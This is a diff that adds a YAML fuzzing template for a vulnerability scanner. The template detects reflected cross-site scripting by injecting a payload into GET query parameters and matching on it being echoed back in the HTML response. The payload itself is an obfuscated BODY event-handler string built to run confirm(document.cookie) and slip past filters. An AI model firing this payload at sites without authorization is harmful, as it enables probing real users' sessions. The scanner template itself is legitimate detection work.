@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-custom
+
+info:
+  name: Custom Reflection XSS Detection
+  author: netbaan
+  severity: low
+  description: |
+    This template detects reflection XSS vulnerabilities using a specified payload that manipulates the body element.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      reflection:
+        - "><BODy onbeforescriptexecute=\"x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\\u006d('+'document'+'.'+x1+c\">"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
